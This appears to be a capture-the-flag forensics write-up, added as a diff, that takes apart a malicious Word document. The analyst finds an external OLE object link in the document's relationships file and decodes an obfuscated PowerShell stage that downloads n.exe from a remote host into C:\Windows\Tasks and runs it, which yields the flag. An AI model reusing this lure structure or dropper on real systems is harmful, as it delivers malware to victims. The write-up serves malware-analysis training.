@@ -1,0 +1,39 @@
+> file diagnostic.doc
+	diagnostic.doc: Zip archive data, at least v2.0 to extract, compression method=store
+
+> unzip diagnostic.doc
+	Archive:  diagnostic.doc
+	  inflating: [Content_Types].xml     
+	  inflating: docProps/core.xml       
+	  inflating: docProps/app.xml        
+	  inflating: word/webSettings.xml    
+	  inflating: word/document.xml       
+	  inflating: word/fontTable.xml      
+	  inflating: word/styles.xml         
+	  inflating: word/settings.xml       
+	  inflating: word/theme/theme1.xml   
+	  inflating: word/_rels/document.xml.rels  
+	  inflating: _rels/.rels 
+
+> grep -R diagnostic *
+	word/_rels/document.xml.rels:<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://diagnostic.htb:31587/223_index_style_fancy.html!" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/></Relationships>
+
+> wget http://diagnostic.htb:31587/223_index_style_fancy.html                                
+	--2023-11-17 10:37:13--  http://diagnostic.htb:31587/223_index_style_fancy.html
+	Resolving diagnostic.htb (diagnostic.htb)... 209.97.140.29
+	Connecting to diagnostic.htb (diagnostic.htb)|209.97.140.29|:31587... connected.
+	HTTP request sent, awaiting response... 200 OK
+	Length: 6151 (6.0K) [text/html]
+	Saving to: ‘223_index_style_fancy.html’
+
+	223_index_style_fancy.html   100%[====================================>]   6.01K  --.-KB/s    in 0.006s  
+
+	2023-11-17 10:37:13 (1.02 MB/s) - ‘223_index_style_fancy.html’ saved [6151/6151]
+
+> cat 223_index_style_fancy.html | grep -oE "JHt.+o=" | base64 -d
+	${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
+	&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
+	&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
+
+> copy 1st line into powershell console and display ${f`ile} value
+	HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}
